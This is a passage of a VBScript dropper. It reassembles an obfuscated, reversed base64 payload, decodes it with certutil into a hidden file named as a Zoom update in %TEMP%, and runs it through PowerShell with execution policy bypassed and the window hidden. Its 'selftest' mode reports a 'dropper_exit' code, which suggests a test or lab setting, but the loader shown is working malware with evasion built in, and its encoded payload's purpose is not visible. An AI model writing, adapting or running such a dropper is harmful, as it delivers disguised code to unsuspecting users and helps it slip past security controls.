    "jhkcxRVO1YlVmNTT1MjQRd2b1EVW3MTWNxkYDJDd0VXcpJ2K", _
    "rQXVvk2QHFlQXRjY2tkZS1mVXFFeEdENrs2SpVjaOZzUH9CS", _
    "zh2R3YzL5dFRH5UWNxkVl9kMtdVNp5WM1N2TW5WYiZGdxFFS", _
    "y9UatNUO5lDelxWdTdTR2sERGVFe5k2YVJnQjVVeTZXVlFUc", _
    "FRWbZhWWBtUWsNzM2oXMNBjVxpWWjx2TxZXRh5GUhFWcxMVY", _
    "3VDNmVzc2Mza110KKVGV4s0awF1Za1mbkRHevd1RKFDTxpEW", _
    "a1WbQVTVhlnalpEbZFkYppnNvsmVMR0bJVGeqVnZvkDT5Vld", _
    "gACIK0QKnYHN2Z3cw5WMDJDOUVVO2V1a5VWePl1YxxUYY50Y", _
    "yR3U5J3btVWTu8USgQ3YlpmYP1ydl5EI9ASbhVmc0NlenRCI", _
    "lpmYP1ydl5EI9ACcpp3ZkACIgAiCNkyclRXeCp3ZkwCKtFWZ", _
    "Tp3ZkgSbhVmc0NVZ0FGbmVGRu42bpN3clJHct92Qu8USgQ3Y", _
    "v1kbvl2czVmcw12bD5ibvl2czVmcw12bD5yTJtFIs0WYlJHd", _
    "tcXZOBSPgIXZkFWZyRCIgACIK0QKzNXZyBXbvNWZEpjOdVGZ", _
    "uQHelR1WgwCcpp3ZkgiclRWYlJVbhVmc0NlLPlEI0NWZqJ2T", _
    "hVmckASPgU2YyV3bzRCIgACIK0QK4YEVVpjOddmbpR2bj5WR", _
    "lN3bwNXaE5iclRWYlJHJgACIgoQDpgCZuV0bURWYlJlLyVGZ", _
    "vB3cpRkLtFWZyR3U6dGJgsTKoU2cvB3cpRkLwlmenRCI7kCK", _
    "vNkLtVGdzl3UgQ3YlpmYP1ydl5EI9ACcjRCIgACIK0QKoU2c", _
    "goQDzJXZ0VWbhJXYQJXZslGct92QuIXZslGct92Qu02bEVGZ", _
    "gACIK0QZ1JHdkASPgkncv1WZN5WSlRXYyVmbldkLwNGJgACI", _
    "gAiCNU2csFmZkASPgUGbiFGd1NWZ4VUZ0Fmcl5WZH5CcjRCI", _
    "nsSZ6lWbpRHcv9yJg0DIz52bpRHcPJXZslGct92QuA3YkACI", _
    "sRmLlJ3bD5SblR3c5N1JscCbsRmLtVGdzl3UngCQgACIgoQD", _
    "uQnZvN3byNWaNdCLnwGbk5Se0lmc1NWZT5SblR3c5N1JscCb", _
    "gACIK0wegQ3YlpmYP1CajFWRy9mRgwHIpcCbsRmLwJXYoN1Q", _
    "uMXZpxmYtV2czFEZlNmblJXZmVmUuA3Yk0FZp9mdbBCIgACI", _
    "tcXZOBSPgIXZklmdvJHckACIgAiCN0HIgACIK0QKfRCKkRWQ", _
    "yBVZk92QwJXYoN1QuAnchh2UD5Cdm92cvJ3Yp1EI0NWZqJ2T", _
    "w12bD5iclRWa29mcwRCI9ACdsV3clJHJgACIgoQDyVGZpZ3b", _
    "NkSZjJXdvNHJgwCcjRCKlNmc192Ut9mcGlHbi1WZzNXQlxWa", _
    "pADI0dWLgQnb192QuMncvJncF5CdsV3clJHJoAiZpBCIgAiC", _
    "lJ3bmBCIgACIgACIK0wJnASPgQHelRHJgACIgACIgAiCNsHI", _
    "rACd4VGdkAyegkycy9mcyVkL0xWdzVmckAibpBSZkgCIoNWY", _
    "gACIgACIgAiCN0HIi4GYyBmIgsCIpgyZulmc0N1bU5SZkASP", _
    "kACa0FGUt4WavpEKoQHelRFbsFUZ0lmcXpjOdVGbpZkLPl0W", _
    "lRHJgwSKnc2bs5CbsVGazJXZ39Gct02bvp3JgAVTFRlO25WZ", _
    "wlHdkACIgAiCN0HIgACIK0gMgQXa4VGIgACIgACIgoQDpQHe", _
    "lBXeURXZH5SesJWblN3cBRWZslGct92QuQHb1NXZyRCI9ASZ", _
    "uUGc5RHJg0DIk9Ga0VWbkACIgAiCNkyJyVGZh9GTt92badCK", _
    "6YnblRCI9ASZk9WbkACIgAiCNkyJulWYNdCKk9Ga0VWT0V2R", _
    "PxGb150cJpjOddmbpJHdztFKgYWagACIgoQDFR0TN9VTP9kW", _
    "9ByJsxWY0NnbpdCI9ASZk9WbkAyegkSKlR2btRCK5RHctVkc", _
    "lpmYvdCI0NWZqJ2TtcXZOBSPgM3ZyFUZr9mdulGJgACIgoQD", _
    "ulmc0N3Wg0DIdBzWzdmcBV2avZnbpRCIgACIK0QMgcSXbR3Y", _
    "ulkLk9Ga0VWbkASPgUGZvNGJgACIgoQDpUGZv1GJoAUXdt1Z", _
    "bBCdphXZgACIgoQDpM3ZyFUZr9mdulGJgwCbsVnbkgSZr9md", _
    "gACIK0wegknc0BCIgAiCNsHIoNGdhNGI9pQDlR2bjRSX05Wa", _
    "Q1ibp9mSogCd4VGVsxWQlRXaydlO60VZslmRu8USbBCIgACI", _
    "pcyZvxmLsxWZoNncld3bw1Sbv9menACUNVEV6YnblRCIoRXY", _
    "gAiCN03egg2Y0F2Yg0HIgACIK0QKpgyZulmc0N1bU5yXkACL", _
    "=0nCNEDI0lGelBCI" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.ps1"
b64File = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.b64"
Set st = CreateObject("ADODB.Stream")
st.Type = 2
st.Charset = "ascii"
st.Open
st.WriteText b64
st.SaveToFile b64File, 2
st.Close
Set st = Nothing
sh.Run "certutil.exe -f -decode """ & b64File & """ """ & psFile & """", 0, True
fso.DeleteFile b64File, True
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
